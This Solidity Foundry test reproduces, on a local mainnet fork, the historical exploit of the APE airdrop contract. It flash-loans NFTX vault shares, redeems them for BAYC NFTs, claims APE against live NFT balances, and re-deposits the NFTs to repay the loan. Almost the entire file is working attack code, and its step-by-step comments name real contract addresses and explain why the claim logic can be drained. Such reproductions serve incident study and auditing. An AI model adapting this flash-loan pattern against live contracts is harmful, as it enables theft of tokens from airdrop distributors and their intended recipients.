// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Exploited tx: https://etherscan.io/tx/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
Debug:
https://dashboard.tenderly.co/tx/mainnet/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
https://tools.blocksec.com/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098*/

// VULNERABILITY: Airdrop eligibility computed from live BAYC balanceOf (no snapshot) + NFTX vault flash-mint redeem
// The airdrop contract (AirdropGrapesToken) in claimTokens() / getClaimable... uses the caller's *current*
// BAYC (beta) + alpha + gamma balanceOf() and tokenOfOwnerByIndex() to count claimable tokens and mark them.
// No ownership snapshot at the start of the claim period. Combined with NFTXVault's ERC3156 flashLoan
// (which flash-mints its ERC20 shares representing 1:1 BAYC, redeem() lets you burn shares to receive real BAYC
// during the callback, fee=0, unrestricted receiver). Attacker borrows shares, redeems for NFTs, claims while
// holding, re-mints to repay. See onFlashLoan for execution.
// Impact: Direct theft of airdrop APE tokens (60k+ in this case) from the distributor pool intended for
// persistent BAYC holders. Any party with >=1 BAYC + flash access can drain without leaving net position in BAYC.

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IBAYCi bayc = IBAYCi(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    INFTXVault NFTXVault = INFTXVault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
    IAirdrop AirdropGrapesToken = IAirdrop(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
    IERC20 ape = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 14_403_948); // fork mainnet at block 14403948
    }

    function test() public {
        // EXPLOIT STEP 1: Acquire initial BAYC NFT ownership (here via prank transferFrom of #1060).
        // This seeds 1 BAYC so that after redeeming 5 more we hold 6 for maximum claim.
        // Real attack used an owned or acquired BAYC; 1 is sufficient to bootstrap.
        cheats.startPrank(0x6703741e913a30D6604481472b6d81F3da45e6E8);
        bayc.transferFrom(0x6703741e913a30D6604481472b6d81F3da45e6E8, address(this), 1060);
        emit log_named_decimal_uint("Before exploiting, Attacker balance of APE is", ape.balanceOf(address(this)), 18);

        // EXPLOIT STEP 2: Approve the NFTX vault shares (the flash loan "token") for max so the
        // ERC3156 post-callback allowance check (allowance >= amount + fee) passes for repayment.
        NFTXVault.approve(address(NFTXVault), type(uint256).max);

        // EXPLOIT STEP 3: Initiate the flash loan of 5.2 vault shares (5.2 BAYC-equivalent) from NFTXVault.
        // This is the core of the attack: see onFlashLoan for the abuse.
        NFTXVault.flashLoan(address(this), address(NFTXVault), 5_200_000_000_000_000_000, ""); // flash loan 5.2 BAYC tokens from the NFTX Vault
        emit log_named_decimal_uint("After exploiting, Attacker balance of APE is", ape.balanceOf(address(this)), 18);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        uint256[] memory blank = new uint256[](0);

        // VULNERABILITY: Unrestricted ERC3156 flash-mint + live-balance airdrop claim
        // The NFTXVault (ERC20 share token) implements flashLoan by _minting temporary shares
        // to the receiver (see ERC20FlashMint.flashLoan: _mint(receiver, amount); onFlashLoan...; _burn).
        // flashFee always returns 0. redeem() burns shares from caller and transfers real BAYC NFTs out
        // (withdrawNFTsTo). The AirdropGrapesToken.claimTokens() (and getClaimable...) computes payout
        // exclusively from the *current* live beta/alpha/gamma.balanceOf(msg.sender) + tokenOfOwnerByIndex
        // loops with no ownership snapshot, no flash protection, and per-token claimed flags only.
        // During the atomic callback the attacker transiently holds the NFTs (balanceOf spikes), claims,
        // then returns the NFTs via mint() to re-mint shares for repayment. No access control on flash.
        // Relevant: Airdrop claimTokens lines ~108 (balanceOf check), ~150-178 (iterating live balances);
        // NFTX flashLoan ~985-1000, redeem ~2110 (burn then withdraw), mint ~2074.
        // Impact: Attacker drains intended airdrop APE (here 60,564) that should only go to
        // persistent/snapshot BAYC holders at claim period start. Vault LPs unaffected (made whole);
        // airdrop distributor loses the mis-claimed tokens. Any 1+ BAYC holder can repeat.

        // EXPLOIT STEP 4 (inside callback): Redeem 5 BAYC NFTs by burning 5 of the flash-minted vault shares.
        // redeem burns `base * 5` shares from msg.sender (the flash receiver) and calls withdrawNFTsTo
        // which transfers 5 random (or specific) BAYC ERC721s from the vault to this contract.
        // "blank" specificIds triggers random redeem (enabled on vault).
        // The attacker now owns the seeded #1060 + 5 redeemed = 6 BAYC transiently.
        NFTXVault.redeem(5, blank);

        // EXPLOIT STEP 5: Call claimTokens while holding 6 BAYC. This is the payout extraction.
        // Because claim uses live balanceOf (not a snapshot), this succeeds for 6x the per-BAYC amount.
        //Owning so many BAYC NFTs allowed the attacker to claim APE tokens for each, resulting in a total amount of 60,564 APE.
        AirdropGrapesToken.claimTokens();

        // EXPLOIT STEP 6: Approve the vault to take back the BAYC NFTs (required for receiveNFTs
        // inside the upcoming mint; uses safeTransferFrom from the approved caller).
        bayc.setApprovalForAll(address(NFTXVault), true);

        uint256[] memory nfts = new uint256[](6);
        nfts[0] = 7594;
        nfts[1] = 4755;
        nfts[2] = 9915;
        nfts[3] = 8214;
        nfts[4] = 8167;
        nfts[5] = 1060;

        // EXPLOIT STEP 7: Re-deposit the 6 BAYC (5 redeemed + seed) to mint 6 shares back.
        // This repays the 5.2 flash principal (plus 0 fee). The shares are then burned by the
        // flashLoan after the callback returns (via the post-callback allowance).
        NFTXVault.mint(nfts, blank);

        NFTXVault.approve(address(NFTXVault), type(uint256).max);

        return CALLBACK_SUCCESS;
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
